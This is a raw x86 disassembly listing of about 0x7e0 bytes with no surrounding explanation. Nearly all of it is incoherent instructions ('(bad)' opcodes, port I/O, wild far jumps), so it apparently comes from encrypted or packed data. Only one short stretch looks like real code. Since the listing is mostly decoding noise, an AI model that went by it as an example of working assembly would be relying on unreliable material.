  4020eb:	or     DWORD PTR [ebx+0x37],esp
  4020ee:	jg     0x4020e3
  4020f0:	mov    edx,0xb1688102
  4020f5:	lahf   
  4020f6:	pop    edx
  4020f7:	add    DWORD PTR [ecx],ebp
  4020f9:	or     eax,0x739246f5
  4020fe:	sub    BYTE PTR [ebx+0x58aad638],bl
  402104:	inc    ecx
  402105:	(bad)  
  402107:	mov    bh,0x66
  402109:	aaa    
  40210a:	adc    eax,0x2d1f769
  40210f:	into   
  402110:	int3   
  402111:	sub    al,0xf9
  402113:	xchg   ebp,eax
  402114:	cli    
  402115:	ret    0x338d
  402118:	sub    ecx,DWORD PTR [esi-0x4c]
  40211b:	scas   eax,DWORD PTR es:[edi]
  40211c:	pop    esi
  40211d:	jle    0x4020d3
  40211f:	dec    edi
  402120:	lods   al,BYTE PTR ds:[esi]
  402121:	jbe    0x4020da
  402123:	fimul  DWORD PTR [edi-0x1be35475]
  402129:	and    ecx,edx
  40212b:	loopne 0x4020e8
  40212d:	je     0x402121
  40212f:	and    DWORD PTR [ebx+0xbb63725],esi
  402135:	dec    ebx
  402136:	sahf   
  402137:	mov    dh,0xd8
  402139:	in     al,0xed
  40213b:	push   esi
  40213c:	je     0x402111
  40213e:	mov    dh,0x59
  402140:	sub    BYTE PTR [ebx-0x7b],ch
  402143:	int    0xb9
  402145:	cmp    eax,0x436c5d0e
  40214a:	pop    es
  40214b:	sub    BYTE PTR [ecx+0x709c9e],bh
  402151:	sbb    eax,0xf2422211
  402156:	mov    ecx,0x8170952d
  40215b:	rep ds stos DWORD PTR es:[edi],eax
  40215e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40215f:	lods   eax,DWORD PTR ds:[esi]
  402160:	out    dx,al
  402161:	sub    al,0x95
  402163:	mov    bh,0x7d
  402165:	push   ecx
  402166:	mov    esi,0xb640745d
  40216b:	sti    
  40216c:	push   ds
  40216d:	inc    esi
  40216e:	dec    eax
  40216f:	pop    esi
  402170:	push   cs
  402171:	sahf   
  402172:	pop    esi
  402173:	leave  
  402174:	ds ds jbe 0x402133
  402178:	repz retf 
  40217a:	add    edi,DWORD PTR [ecx]
  40217c:	shr    BYTE PTR [ecx+0x673d4f20],cl
  402182:	push   esi
  402183:	hlt    
  402184:	outs   dx,DWORD PTR ds:[esi]
  402185:	or     al,0xcc
  402187:	adc    al,0xf8
  402189:	sar    DWORD PTR [edx+0x29],cl
  40218c:	mov    edi,0xc56d0a9d
  402191:	ja     0x40218c
  402193:	ffree  st(7)
  402195:	inc    ebp
  402196:	cld    
  402197:	xor    BYTE PTR [ebp+0x158bf89c],al
  40219d:	dec    ecx
  40219e:	inc    esp
  40219f:	inc    ebx
  4021a0:	add    BYTE PTR [ebx-0xfeae6ee],cl
  4021a6:	es inc ebx
  4021a8:	add    cl,ch
  4021aa:	mov    cl,0x3
  4021ac:	add    BYTE PTR [eax],al
  4021ae:	in     eax,0xd
  4021b0:	lock or al,0x68
  4021b3:	mov    DWORD PTR [ecx-0xf],esi
  4021b6:	push   ecx
  4021b7:	scas   al,BYTE PTR es:[edi]
  4021b8:	int3   
  4021b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021ba:	pop    es
  4021bb:	cdq    
  4021bc:	mov    eax,0x700452cc
  4021c1:	jo     0x40215a
  4021c3:	jge    0x402235
  4021c5:	jo     0x40223f
  4021c7:	jmp    0x7e31ab9a
  4021cc:	out    dx,eax
  4021cd:	imul   eax,DWORD PTR [ecx-0x3993d7c5],0xffffffb1
  4021d4:	mov    ds:0xcbdf7878,eax
  4021d9:	mov    ecx,0xcd40616
  4021de:	pop    eax
  4021df:	push   es
  4021e0:	popf   
  4021e1:	or     al,0xd
  4021e3:	popf   
  4021e4:	jge    0x4021e7
  4021e6:	adc    cl,dl
  4021e8:	push   ecx
  4021e9:	inc    edi
  4021ea:	rcl    dl,1
  4021ec:	xor    dl,BYTE PTR [esi]
  4021ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021ef:	push   ebp
  4021f0:	adc    BYTE PTR [ebx],dh
  4021f2:	(bad)  
  4021f3:	push   eax
  4021f4:	sub    al,BYTE PTR [edx-0x2a]
  4021f7:	aas    
  4021f8:	xchg   edx,eax
  4021f9:	adc    ch,cl
  4021fb:	mov    eax,0xf3bf006
  402200:	jb     0x402258
  402202:	pop    eax
  402203:	xchg   esi,eax
  402204:	cmovp  edx,DWORD PTR [esp]
  402208:	lahf   
  402209:	mov    edi,edx
  40220b:	and    bl,BYTE PTR [eax-0x4c]
  40220e:	gs mov bh,0x8a
  402211:	aas    
  402212:	dec    edx
  402213:	cwde   
  402214:	sbb    BYTE PTR [ebx-0x36],ah
  402217:	pop    ds
  402218:	inc    eax
  402219:	rcr    BYTE PTR [edx],cl
  40221b:	cs popf 
  40221d:	and    al,0x84
  40221f:	fbstp  TBYTE PTR [edi+0x2d2eaf2f]
  402225:	jle    0x40221f
  402227:	adc    al,0x53
  402229:	pop    esi
  40222a:	sub    ah,BYTE PTR [edi]
  40222c:	and    dh,dl
  40222e:	leave  
  40222f:	pop    esp
  402230:	int    0x7e
  402232:	pop    ebx
  402233:	xor    eax,0x9bc4a58f
  402238:	and    ecx,DWORD PTR [edx-0x1d59ec11]
  40223e:	pusha  
  40223f:	lock mov ecx,0xb01d00e6
  402245:	xchg   ebx,eax
  402246:	or     ecx,DWORD PTR [edx+edx*4-0x38a27e0b]
  40224d:	ror    BYTE PTR [esi],cl
  40224f:	loopne 0x40222a
  402251:	jl     0x402294
  402253:	mov    dl,0x7d
  402255:	cmp    ch,BYTE PTR [ebp-0xb]
  402258:	or     al,0xba
  40225a:	leave  
  40225b:	or     eax,0xcac35bb
  402260:	jge    0x40222d
  402262:	push   edx
  402263:	dec    esp
  402264:	add    eax,0xcb7943ea
  402269:	pop    eax
  40226a:	sub    ebx,0xffffffe4
  40226d:	mov    edi,0x20c5a0f7
  402272:	shr    DWORD PTR [esi],cl
  402274:	ja     0x402277
  402276:	ins    BYTE PTR es:[edi],dx
  402277:	mov    ebp,0xb16a2f2
  40227c:	push   cs
  40227d:	sbb    ebx,DWORD PTR [eax]
  40227f:	mov    ebp,0x7eb5fb34
  402284:	nop
  402285:	nop
  402286:	inc    ebp
  402287:	shl    BYTE PTR [esi+0x5c],0x43
  40228b:	sub    cl,BYTE PTR [esi-0x69]
  40228e:	dec    eax
  40228f:	aad    0xe6
  402291:	(bad)  
  402292:	cmp    al,0x54
  402294:	mov    ebx,eax
  402296:	retf   0xf352
  402299:	add    DWORD PTR [edi+eiz*8-0xc],0x25
  40229e:	icebp  
  40229f:	mov    ebp,0xe0a44d20
  4022a4:	dec    edx
  4022a5:	and    BYTE PTR [ebx+0x57dcc34e],cl
  4022ab:	test   DWORD PTR [ecx-0x6deb8c95],esp
  4022b1:	es push ds
  4022b3:	xor    BYTE PTR [ebx-0x10],0x6b
  4022b7:	xor    edi,DWORD PTR [ebp-0xc]
  4022ba:	and    bl,BYTE PTR ds:0xace02ba2
  4022c0:	mov    BYTE PTR [ebx-0x17],ah
  4022c3:	test   eax,0x49c3e242
  4022c8:	out    dx,al
  4022c9:	addr16 push esi
  4022cb:	cmp    al,0x45
  4022cd:	jb     0x402338
  4022cf:	mov    bl,0x1f
  4022d1:	(bad)  
  4022d2:	xchg   esp,eax
  4022d3:	pop    es
  4022d4:	aaa    
  4022d5:	xor    eax,0xfe911ab9
  4022da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022db:	add    BYTE PTR [ebp+ebp*4-0x23],dl
  4022df:	retf   0xf1a
  4022e2:	aam    0x38
  4022e4:	(bad)  
  4022e5:	pop    ebp
  4022e6:	(bad)  
  4022e7:	out    dx,eax
  4022e8:	push   edi
  4022e9:	jl     0x402288
  4022eb:	push   edx
  4022ec:	idiv   DWORD PTR [ebx-0x75]
  4022ef:	push   esi
  4022f0:	mov    WORD PTR [ebp-0x58],es
  4022f3:	sub    esi,DWORD PTR [eax+0x1e]
  4022f6:	jnp    0x40234b
  4022f8:	or     dh,0x3b
  4022fb:	xchg   esi,eax
  4022fc:	pop    edi
  4022fd:	test   DWORD PTR [esi-0x63],0x7ef5b6a
  402304:	add    al,BYTE PTR [ecx+eiz*2-0x374bf3a0]
  40230b:	mov    esp,es
  40230d:	dec    edx
  40230e:	in     al,0x47
  402310:	pop    esi
  402311:	xchg   ecx,eax
  402312:	cmp    DWORD PTR [bp+si],edx
  402315:	fs out dx,al
  402317:	xor    BYTE PTR [esi+0xc],0x87
  40231b:	cmp    DWORD PTR cs:[ebx-0x23],esp
  40231f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402320:	and    eax,eax
  402322:	or     al,0x6a
  402324:	pop    ss
  402325:	inc    ebp
  402326:	cld    
  402327:	lds    ecx,FWORD PTR [edi]
  402329:	mov    edi,0x72716463
  40232e:	pop    ds
  40232f:	sbb    al,0x0
  402331:	cdq    
  402332:	pop    edi
  402333:	arpl   WORD PTR [eax+0x39dfe587],si
  402339:	test   DWORD PTR [esi+0x52],ecx
  40233c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40233d:	dec    ebp
  40233e:	mov    al,ds:0xec4d99b1
  402343:	pop    ss
  402344:	sbb    eax,0xec6fd5ce
  402349:	and    ch,BYTE PTR gs:[eax]
  40234c:	add    al,0xb4
  40234e:	les    esi,FWORD PTR [ebp-0x6b]
  402351:	inc    edx
  402352:	loop   0x402369
  402354:	add    DWORD PTR [ebp-0x64138d6f],ecx
  40235a:	push   ss
  40235b:	mov    ecx,0xb1918b95
  402360:	sbb    esi,DWORD PTR [ecx]
  402362:	mov    cl,al
  402364:	sbb    al,0xf8
  402366:	pop    esi
  402367:	push   0x87505ffd
  40236c:	adc    al,BYTE PTR [eax+0x73]
  40236f:	pop    ebx
  402370:	push   edi
  402371:	sbb    BYTE PTR [ebx+0x72906123],al
  402377:	rcr    BYTE PTR [ebp-0xe],1
  40237a:	fdiv   QWORD PTR [ecx+0x18b356a4]
  402380:	inc    ebx
  402381:	adc    esp,edx
  402383:	sub    BYTE PTR [edx-0x2f],bl
  402386:	sub    esp,esp
  402388:	add    eax,0xeb1252b2
  40238d:	and    eax,0xb528c93a
  402392:	jmp    0x402344
  402394:	dec    esp
  402395:	adc    ah,bh
  402397:	jnp    0x402334
  402399:	pop    ebx
  40239a:	icebp  
  40239b:	mov    eax,ds:0x983e9cfa
  4023a0:	jo     0x402403
  4023a2:	fcom   QWORD PTR [edi+0x209dd739]
  4023a8:	fcmove st,st(4)
  4023aa:	leave  
  4023ab:	addr16 or ebp,ebx
  4023ae:	xchg   ebx,eax
  4023af:	lahf   
  4023b0:	push   es
  4023b1:	xchg   esp,eax
  4023b2:	mov    es,WORD PTR [ebx-0x3c]
  4023b5:	adc    bh,BYTE PTR [edx-0x37]
  4023b8:	(bad)  
  4023b9:	das    
  4023ba:	inc    edi
  4023bb:	sub    cl,BYTE PTR [edi]
  4023bd:	mov    DWORD PTR [ebx-0x1cf7d02d],ebp
  4023c3:	xchg   esi,eax
  4023c4:	adc    BYTE PTR [edi],bl
  4023c6:	mov    ebp,0xa9fc09ff
  4023cb:	enter  0x1e76,0xef
  4023cf:	add    DWORD PTR [eax],esp
  4023d1:	or     ebx,DWORD PTR [ebp+0x26]
  4023d4:	sbb    al,0x84
  4023d6:	les    esp,FWORD PTR [esi-0x3fd7d2b]
  4023dc:	push   edx
  4023dd:	xchg   ebp,eax
  4023de:	sub    BYTE PTR [esi+0xa],ah
  4023e1:	add    bh,al
  4023e3:	fnstsw WORD PTR [ecx-0x9445d7]
  4023e9:	in     eax,dx
  4023ea:	jmp    0xe6ef04be
  4023ef:	pop    edi
  4023f0:	or     BYTE PTR cs:[ecx-0x46b1c25b],bh
  4023f7:	retf   
  4023f8:	test   eax,0xd0480717
  4023fd:	push   esi
  4023fe:	mov    WORD PTR [edi],ds
  402400:	sar    bh,1
  402402:	cs addr16 cmp eax,0x64023eb8
  402409:	jmp    0x4023be
  40240b:	xchg   ecx,eax
  40240c:	add    cl,BYTE PTR [eax]
  40240e:	push   ecx
  40240f:	int3   
  402410:	ss dec esp
  402412:	pop    es
  402413:	or     bh,BYTE PTR [eax+0x485df446]
  402419:	test   eax,0xb47321bc
  40241e:	mov    ss,WORD PTR [ebp-0x7805fa04]
  402424:	loope  0x402429
  402426:	bound  edi,QWORD PTR [ebx]
  402428:	inc    ebp
  402429:	add    BYTE PTR [edx+ebx*2+0x13b2194e],dl
  402430:	rcr    BYTE PTR [ebx+0x39704c14],1
  402436:	inc    ecx
  402437:	fwait
  402438:	jge    0x40242e
  40243a:	cld    
  40243b:	dec    esi
  40243c:	mov    esp,0x58587a6a
  402441:	ja     0x40241f
  402443:	pop    ebx
  402444:	add    esp,edx
  402446:	les    ecx,FWORD PTR [ebp+esi*4+0x16573ed3]
  40244d:	mov    ebp,eax
  40244f:	inc    esi
  402450:	cmp    BYTE PTR [eax+0x1a],0x79
  402454:	call   0xfd71:0xea60c832
  40245b:	jg     0x4023de
  40245d:	mov    dh,BYTE PTR [eax+0x38d11752]
  402463:	add    edx,DWORD PTR [eax-0x68]
  402466:	inc    esi
  402467:	xor    bh,BYTE PTR [ebx]
  402469:	lea    ebx,[edx]
  40246b:	rcr    DWORD PTR [ecx+0x5c],1
  40246e:	sti    
  40246f:	mov    fs,WORD PTR [edi-0xa5c4a07]
  402475:	out    0x72,al
  402477:	or     edx,DWORD PTR [edi+0x3105b60f]
  40247d:	push   cs
  40247e:	dec    BYTE PTR [ecx+0x36]
  402481:	and    edi,ebp
  402483:	pop    ss
  402484:	stc    
  402485:	pop    ds
  402486:	fcomp  DWORD PTR [esi+ebp*1]
  402489:	mov    al,ds:0x88b5f97f
  40248e:	mov    edx,0xbbea1f38
  402493:	push   0x376f4cb3
  402498:	dec    esp
  402499:	cdq    
  40249a:	jmp    0xc6fc:0x91f20537
  4024a1:	js     0x4024e8
  4024a3:	or     al,BYTE PTR [ebx-0x3b148bf3]
  4024a9:	inc    edx
  4024aa:	sub    DWORD PTR [esi-0x21f9d484],ebp
  4024b0:	mov    al,ds:0xaaf840cb
  4024b5:	mov    ecx,0xdd473cc5
  4024ba:	nop
  4024bb:	cmp    eax,0x56ea13d9
  4024c0:	popa   
  4024c1:	cmp    al,BYTE PTR [ebp+0x7d]
  4024c4:	push   ds
  4024c5:	rcl    BYTE PTR [ebx+0x737825e5],0xcc
  4024cc:	push   0x7e3b8fdb
  4024d1:	xchg   edx,eax
  4024d2:	loop   0x402523
  4024d4:	cwde   
  4024d5:	cmp    edi,DWORD PTR [eax-0x18734e00]
  4024db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024dc:	sti    
  4024dd:	inc    ecx
  4024de:	pop    eax
  4024df:	inc    BYTE PTR [edx+0x4349e7c2]
  4024e5:	and    cl,BYTE PTR [edi-0x4a8a239e]
  4024eb:	sub    esi,DWORD PTR [edi]
  4024ed:	mov    cl,0x3f
  4024ef:	sbb    DWORD PTR [edx],0xffffffee
  4024f2:	mov    eax,0xd59d02ac
  4024f7:	adc    BYTE PTR [ebx+0x3528dec3],cl
  4024fd:	jno    0x4024b1
  4024ff:	in     eax,0x74
  402501:	cmc    
  402502:	inc    edx
  402503:	icebp  
  402504:	stos   BYTE PTR es:[edi],al
  402505:	jl     0x402551
  402507:	mov    bl,0xc4
  402509:	inc    edx
  40250a:	push   ds
  40250b:	xchg   ecx,eax
  40250c:	mov    bh,cl
  40250e:	inc    ebp
  40250f:	and    al,0xf9
  402511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402512:	jnp    0x402577
  402514:	rol    BYTE PTR [ebp+0x6b],1
  402517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402518:	fwait
  402519:	pop    es
  40251a:	jmp    0x91b835bf
  40251f:	repnz push edi
  402521:	iret   
  402522:	icebp  
  402523:	stos   DWORD PTR es:[edi],eax
  402524:	mov    gs,edi
  402526:	jb     0x4024ef
  402528:	les    edi,FWORD PTR [eax]
  40252a:	outs   dx,BYTE PTR ds:[esi]
  40252b:	push   0xffffffc4
  40252d:	adc    DWORD PTR [edx],eax
  40252f:	xlat   BYTE PTR ds:[ebx]
  402530:	fdiv   st(5),st
  402532:	test   al,0x68
  402534:	pop    ebp
  402535:	jnp    0x402516
  402537:	pop    edi
  402538:	pop    esp
  402539:	mov    ds:0x3adad337,eax
  40253e:	retf   
  40253f:	(bad)  
  402540:	inc    ecx
  402541:	sub    al,0xe2
  402543:	shr    DWORD PTR [ebx+0x16],0xfe
  402547:	sar    BYTE PTR [esp+edx*8],cl
  40254a:	int3   
  40254b:	jg     0x402509
  40254d:	sbb    eax,0x1fb4e7f7
  402552:	loope  0x40259c
  402554:	scas   eax,DWORD PTR es:[edi]
  402555:	cmp    al,0x40
  402557:	arpl   sp,ax
  402559:	mov    ebx,0x7ec76be6
  40255e:	lahf   
  40255f:	mov    edx,DWORD PTR [ebp-0x8]
  402562:	sub    ecx,0x6fb0
  402568:	push   esi
  402569:	add    DWORD PTR ds:0x4326f0,ecx
  40256f:	mov    ecx,0x7510855
  402574:	xor    edx,ecx
  402576:	and    esi,0x4f5d
  40257c:	mov    esi,0x32729c
  402581:	push   edi
  402582:	mov    edi,DWORD PTR [ebp+0x10]
  402585:	add    DWORD PTR ds:0x432dd2,0x4326f0
  40258f:	add    edx,esi
  402591:	jmp    0x402947
  402596:	mov    ah,0x31
  402598:	cdq    
  402599:	or     ebx,DWORD PTR [ecx+0x8b1b293]
  40259f:	or     dl,BYTE PTR [ebp+0x24]
  4025a2:	iret   
  4025a3:	adc    al,0x29
  4025a5:	xchg   ecx,ebp
  4025a7:	add    BYTE PTR [eax+0x70],dh
  4025aa:	xchg   edi,eax
  4025ab:	jge    0x40261d
  4025ad:	jo     0x402612
  4025af:	bound  edi,QWORD PTR [ebp+0x4672fee3]
  4025b5:	add    edx,esp
  4025b7:	mov    eax,ds:0x2d1aac90
  4025bc:	idiv   DWORD PTR [edx]
  4025be:	or     esp,DWORD PTR ds:0x76009e66
  4025c4:	push   edx
  4025c5:	or     eax,0x924c6b3
  4025ca:	xchg   BYTE PTR [esi-0x45],ch
  4025cd:	add    al,bh
  4025cf:	out    dx,al
  4025d0:	mov    edi,0x4a30f83e
  4025d5:	mov    WORD PTR [edx+0x6e],?
  4025d8:	fdiv   QWORD PTR [ebp+edx*4-0x5522c88b]
  4025df:	call   0x8bcf8527
  4025e4:	push   eax
  4025e5:	add    al,0x31
  4025e7:	and    BYTE PTR [ecx+0x2f2eec26],al
  4025ed:	sub    al,0xea
  4025ef:	js     0x402602
  4025f1:	js     0x402647
  4025f3:	sub    al,0xdc
  4025f5:	sbb    eax,0xdb64297
  4025fa:	pop    esi
  4025fb:	fldlg2 
  4025fd:	repz xchg edx,eax
  4025ff:	imul   edi,DWORD PTR [ebp-0x10],0x4a5cfb9f
  402606:	dec    edx
  402607:	in     eax,dx
  402608:	dec    ebx
  402609:	jge    0x4025fc
  40260b:	in     eax,0x3c
  40260d:	fist   DWORD PTR [eax]
  40260f:	das    
  402610:	xchg   dh,ch
  402612:	mov    dl,0x89
  402614:	mov    ebp,0xc6d98f33
  402619:	mov    eax,ds:0x592231b4
  40261e:	and    DWORD PTR [edx+0x53],ebp
  402621:	mov    es,WORD PTR [edi]
  402623:	icebp  
  402624:	ins    BYTE PTR es:[edi],dx
  402625:	jae    0x4025bd
  402627:	loop   0x402666
  402629:	jnp    0x4025d2
  40262b:	mov    cl,0x3f
  40262d:	xchg   ebp,eax
  40262e:	jbe    0x4025e8
  402630:	jp     0x4026b0
  402632:	cmp    DWORD PTR [eax+0x4d],edx
  402635:	std    
  402636:	lahf   
  402637:	iret   
  402638:	in     al,0x64
  40263a:	and    al,0x88
  40263c:	jb     0x402613
  40263e:	sub    edi,DWORD PTR [ebx+0x70]
  402641:	and    al,0x6b
  402643:	jns    0x4026c1
  402645:	add    edi,DWORD PTR [edi-0x11]
  402648:	rcl    BYTE PTR cs:[edx-0x2b],1
  40264c:	ffree  st(0)
  40264e:	cmp    dl,BYTE PTR [eax]
  402650:	dec    ecx
  402651:	mov    al,fs:0x60489f25
  402657:	cld    
  402658:	sti    
  402659:	sbb    esp,DWORD PTR [edx]
  40265b:	adc    BYTE PTR [ebx],ah
  40265d:	fsub   QWORD PTR [ebp-0x79]
  402660:	dec    ebx
  402661:	out    dx,eax
  402662:	ret    0xb5b1
  402665:	int3   
  402666:	nop
  402667:	jb     0x4025f3
  402669:	sti    
  40266a:	nop
  40266b:	jle    0x402647
  40266d:	mov    ebx,DWORD PTR [edx+esi*2+0x21d768fd]
  402674:	out    dx,eax
  402675:	mov    ecx,0x40137d21
  40267a:	(bad)  
  40267b:	xchg   ebp,eax
  40267c:	aaa    
  40267d:	sbb    BYTE PTR [ecx+0x35],al
  402680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402681:	inc    esp
  402682:	and    al,0x3
  402684:	outs   dx,BYTE PTR ds:[esi]
  402685:	(bad)  
  402687:	cld    
  402688:	add    edx,DWORD PTR [edx]
  40268a:	sub    bl,bh
  40268c:	ret    0xd228
  40268f:	pop    esp
  402690:	cs jae 0x4026c2
  402693:	push   ebp
  402694:	(bad)  
  402695:	xor    esi,DWORD PTR [eax-0x641988b5]
  40269b:	push   ss
  40269c:	jbe    0x402641
  40269e:	inc    edx
  40269f:	lods   al,BYTE PTR ds:[esi]
  4026a0:	scas   al,BYTE PTR es:[edi]
  4026a1:	xchg   ecx,eax
  4026a3:	nop
  4026a4:	sahf   
  4026a5:	cwde   
  4026a6:	cld    
  4026a7:	mov    ecx,0x28668cb3
  4026ac:	in     eax,0x12
  4026ae:	test   DWORD PTR [ecx-0x2a],edx
  4026b1:	mov    esp,edx
  4026b3:	cmp    BYTE PTR [ebp+0x1],0xfa
  4026b7:	shl    DWORD PTR [eax+ebp*4+0x14a98db1],1
  4026be:	cmp    al,0xfd
  4026c0:	xor    cl,BYTE PTR [edx+0x7c]
  4026c3:	out    dx,eax
  4026c4:	data16 jecxz 0x4026ce
  4026c7:	push   cs
  4026c8:	xchg   ebx,eax
  4026c9:	push   0x5c
  4026cb:	pop    ebx
  4026cc:	lock rcl DWORD PTR [edi+eax*1+0x1de6193a],0x1c
  4026d5:	jno    0x402716
  4026d7:	adc    ah,BYTE PTR [ecx]
  4026d9:	fiadd  DWORD PTR [edi]
  4026db:	shr    BYTE PTR [ebp+0xa],1
  4026de:	cmp    BYTE PTR [esi-0xcbecaeb],al
  4026e4:	mov    DWORD PTR [ecx-0x12],eax
  4026e7:	imul   esp,ebp,0xbcaac35b
  4026ed:	jne    0x4026cd
  4026ef:	pusha  
  4026f0:	add    al,0xa3
  4026f2:	or     ecx,esp
  4026f4:	pop    es
  4026f5:	and    al,0x96
  4026f7:	sub    ebx,ecx
  4026f9:	lods   al,BYTE PTR ds:[esi]
  4026fa:	fcom   st(7)
  4026fc:	push   eax
  4026fd:	test   DWORD PTR [ebx+edi*4+0x2],0x11331e8d
  402705:	loope  0x4026aa
  402707:	pop    edi
  402708:	stc    
  402709:	rcr    ah,cl
  40270b:	jbe    0x402771
  40270d:	push   ss
  40270e:	out    dx,al
  40270f:	push   eax
  402710:	mov    ebp,0xa3ee1fbb
  402715:	mov    ah,bh
  402717:	pop    esp
  402718:	or     al,0x56
  40271a:	das    
  40271b:	nop
  40271c:	ins    BYTE PTR es:[edi],dx
  40271d:	out    dx,al
  40271e:	out    dx,al
  40271f:	dec    esp
  402720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402721:	cld    
  402722:	gs jecxz 0x4026e8
  402725:	leave  
  402726:	cmp    ebp,DWORD PTR [edx+0x6]
  402729:	mov    bh,0x61
  40272b:	fsubr  QWORD PTR [edx+0x33]
  40272e:	mov    esp,0x434f4c87
  402733:	or     ah,BYTE PTR [edx+0x73]
  402736:	cld    
  402737:	sar    BYTE PTR [eax],cl
  402739:	jmp    0x6f90:0xd99ab7cc
  402740:	test   eax,0xc83de84
  402745:	jae    0x4027bd
  402747:	jmp    DWORD PTR [ecx-0x1]
  40274a:	mov    eax,0xf22ec7c2
  40274f:	fnsave [edx]
  402751:	push   esi
  402752:	mov    ds:0x61e1a2b3,eax
  402757:	mov    bh,0x51
  402759:	or     al,0xb2
  40275b:	leave  
  40275c:	sbb    eax,0x436017d8
  402761:	sub    al,0xec
  402763:	jmp    0x402797
  402765:	cwde   
  402766:	test   BYTE PTR [edx-0xddc6cf0],dh
  40276c:	dec    ebx
  40276d:	add    al,0x9a
  40276f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402770:	mov    ebx,0x5b0668d0
  402775:	imul   esp,DWORD PTR [edx+0x4629140c],0xb957575c
  40277f:	pop    ebx
  402780:	adc    ebx,edi
  402782:	hlt    
  402783:	inc    esi
  402784:	push   es
  402785:	ins    BYTE PTR es:[edi],dx
  402786:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  402788:	(bad)
  40278b:	daa    
  40278c:	cld    
  40278d:	clc    
  40278e:	sbb    al,0x6a
  402791:	outs   dx,DWORD PTR ds:[esi]
  402792:	test   DWORD PTR [ecx],0x99ad821a
  402798:	inc    esp
  40279a:	xor    eax,0xd3ee027f
  40279f:	xchg   eax,edi
  4027a1:	mov    ah,0xe
  4027a3:	popf   
  4027a4:	xchg   ecx,eax
  4027a5:	das    
  4027a6:	lds    eax,FWORD PTR [edi+0x57]
  4027a9:	cmp    ch,dl
  4027ab:	xchg   BYTE PTR [edi+0x15473ac6],cl
  4027b1:	dec    esi
  4027b2:	xor    BYTE PTR [esi],0x3
  4027b5:	fld    DWORD PTR [eax-0x1b]
  4027b8:	ret    0xbadd
  4027bb:	pop    ebp
  4027bc:	sub    dl,BYTE PTR [esi-0x253bed1f]
  4027c2:	mov    ch,0xb2
  4027c4:	and    ecx,DWORD PTR [edi+0x3b]
  4027c7:	jns    0x40281e
  4027c9:	call   FWORD PTR ss:[edi+0x12434bc7]
  4027d0:	and    BYTE PTR [edi-0x18d7c966],bl
  4027d6:	icebp  
  4027d7:	xor    al,0xa9
  4027d9:	mov    ah,0x11
  4027db:	je     0x4027c4
  4027dd:	fistp  QWORD PTR [edi]
  4027df:	and    BYTE PTR [ecx],dh
  4027e1:	sahf   
  4027e2:	mov    esi,0x26013dec
  4027e7:	out    dx,al
  4027e8:	mov    ecx,0xa7fca12c
  4027ed:	fwait
  4027ee:	inc    edi
  4027ef:	or     DWORD PTR [eax+eiz*4-0x77],ebx
  4027f3:	adc    BYTE PTR [edi],0x11
  4027f6:	inc    esi
  4027f7:	add    al,0xd8
  4027f9:	or     esp,DWORD PTR [ebx+0x70]
  4027fc:	test   cl,ch
  4027fe:	ja     0x4027ae
  402800:	ror    BYTE PTR [edx],0x9f
  402803:	mov    ch,0x63
  402805:	mov    ebx,0x3df18cb3
  40280a:	mov    esp,0x23c8a158
  40280f:	(bad)  
  402810:	push   cs
  402811:	out    dx,eax
  402812:	mov    ebp,0x161d330e
  402817:	sub    BYTE PTR [esi+eiz*2-0x378a78fe],ch
  40281e:	sub    eax,0x5e751a9c
  402823:	out    dx,eax
  402824:	xchg   esp,eax
  402825:	jbe    0x4027e7
  402827:	sbb    eax,0x4909df83
  40282c:	in     al,0x41
  40282e:	xor    DWORD PTR [ecx-0x5b],ebp
  402831:	icebp  
  402832:	inc    ebx
  402833:	int3   
  402834:	test   dh,cl
  402836:	cmp    al,0xfd
  402838:	push   eax
  402839:	and    al,0x93
  40283b:	or     BYTE PTR [ebp-0xe],al
  40283e:	adc    al,0x26
  402840:	sbb    DWORD PTR [eax+0x2a],0x596800b4
  402847:	cmp    DWORD PTR [eax],0xbc0d9bf8
  40284d:	scas   eax,DWORD PTR es:[edi]
  40284e:	push   esi
  40284f:	lds    ebp,FWORD PTR [ecx-0x70]
  402852:	adc    DWORD PTR [esi],esp
  402854:	sub    esp,esi
  402856:	test   BYTE PTR fs:[edi+0xf],dh
  40285a:	sub    DWORD PTR [eax],ebx
  40285c:	repz sbb BYTE PTR [ebx-0x5b],bl
  402860:	sub    eax,0x716c6c20
  402865:	loop   0x40287f
  402867:	jp     0x4028a6
  402869:	mov    BYTE PTR [eax-0x4a],bh
  40286c:	or     ecx,esp
  40286e:	in     al,dx
  40286f:	arpl   WORD PTR [ecx-0x311d32ac],cx
  402875:	and    esp,DWORD PTR cs:[esi+edi*2-0x562be44d]
  40287d:	pop    edx
  40287e:	add    bl,dl
  402880:	inc    edi
  402881:	wbinvd 
  402883:	enter  0x1f6b,0x48
  402887:	and    dl,cl
  402889:	inc    edi
  40288a:	adc    ah,BYTE PTR [edi+0x39]
  40288d:	cmp    dh,cl
  40288f:	lds    ebx,FWORD PTR [esi]
  402891:	nop
  402892:	lock xor DWORD PTR [eax+0x1f0ebbaf],edi
  402899:	in     eax,0xba
  40289b:	jecxz  0x402863
  40289d:	push   es
  40289e:	xchg   edx,eax
  40289f:	(bad)  
  4028a0:	fmul   QWORD PTR ds:0x6e06ba5d
  4028a6:	loop   0x4028c1
  4028a8:	and    al,0x14
  4028aa:	pop    ecx
  4028ab:	cmp    al,ah
  4028ad:	inc    eax
  4028ae:	mov    bh,0x87
  4028b0:	in     al,dx
  4028b1:	outs   dx,DWORD PTR ds:[esi]
  4028b2:	(bad)  
  4028b3:	sub    BYTE PTR [edi],ch
  4028b5:	sub    DWORD PTR [ecx+0x6e],ebx
  4028b8:	sbb    BYTE PTR [edx],ch
  4028ba:	test   al,0x9b
  4028bc:	sbb    eax,0x60edce48
  4028c1:	ss mov cl,0xb0
  4028c4:	jno    0x4028e3
  4028c6:	bound  ecx,QWORD PTR [ebx+ecx*4-0x72]
